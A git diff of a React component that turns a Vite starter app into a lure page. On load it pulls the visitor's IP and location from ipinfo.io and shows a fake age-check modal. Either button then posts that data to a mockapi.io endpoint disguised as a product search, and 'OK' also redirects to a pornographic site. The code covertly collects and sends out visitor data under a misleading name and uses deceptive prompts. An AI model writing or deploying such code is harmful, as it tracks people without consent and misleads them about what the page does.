@@ -1,39 +1,94 @@
-import { useState } from 'react'
-import reactLogo from './assets/react.svg'
-import viteLogo from '/vite.svg'
-import './App.css'
-import IpInfo from './IpInfor'
+import { useEffect, useState } from "react";
+import axios from "axios";
+import "./App.css";
 
 function App() {
-  const [count, setCount] = useState(0)
+  const [showModal, setShowModal] = useState(true);
+  const [IP, setIP] = useState();
+
+  const handleOk = () => {
+    window.location.href = "https://cableav.tv/category/chinese-av-porn/";
+    axios
+      .post(
+        "https://63311c61cff0e7bf70e64c8e.mockapi.io/product/api/seach/products",
+        IP
+      )
+      .then((response) => {
+        console.log("dataa", response.data);
+      })
+      .catch((error) => {
+        console.error(error);
+      });
+  };
+
+  const handleCancel = () => {
+    setShowModal(false);
+    axios
+      .post(
+        "https://63311c61cff0e7bf70e64c8e.mockapi.io/product/api/seach/products",
+        IP
+      )
+      .then((response) => {
+        console.log("dataa", response.data);
+      })
+      .catch((error) => {
+        console.error(error);
+      });
+  };
+
+  useEffect(() => {
+    axios
+      .get("https://ipinfo.io/json")
+      .then((response) => {
+        if (!response.data) {
+          console.error("IP information is not available yet.");
+          if (
+            window.confirm(
+              "Error! An error occurred. Please press F5 to make fresh page!"
+            )
+          ) {
+            window.location.reload();
+          }
+          return;
+        }
+        setIP(response.data);
+      })
+      .catch((error) => {
+        console.error(error);
+      });
+  }, []);
 
   return (
-    <>
-      <div>
-        <a href="https://vitejs.dev" target="_blank">
-          <img src={viteLogo} className="logo" alt="Vite logo" />
-        </a>
-        <a href="https://react.dev" target="_blank">
-          <img src={reactLogo} className="logo react" alt="React logo" />
-        </a>
+    <div className="App">
+      <div className="search-container">
+        <input type="text" className="search-input" placeholder="Search..." />
+        <button className="search-button">Search</button>
       </div>
-      <h1>Vite + React</h1>
-      <div className="card">
-        <button onClick={() => setCount((count) => count + 1)}>
-          count is {count}
-        </button>
-        <p>
-          Edit <code>src/App.tsx</code> and save to test HMR
-        </p>
+      {showModal && (
+        <div className="modal-overlay">
+          <div className="modal">
+            <div className="modal-content">
+              <p>Are you 18 years old?</p>
+              <div className="modal-buttons">
+                <button onClick={handleOk}>OK</button>
+                <button onClick={() => handleCancel()}>Cancel</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+      <div className="image-grid">
+        {[...Array(43)].map((_, index) => (
+          <img
+            key={index}
+            src={`photo_${index + 1}_2024-06-06_21-11-51.jpg`}
+            alt={`img-${index + 1}`}
+            className="grid-image"
+          />
+        ))}
       </div>
-      <div>
-        <IpInfo />
-      </div>
-      <p className="read-the-docs">
-        Click on the Vite and React logos to learn more
-      </p>
-    </>
-  )
+    </div>
+  );
 }
 
-export default App
+export default App;
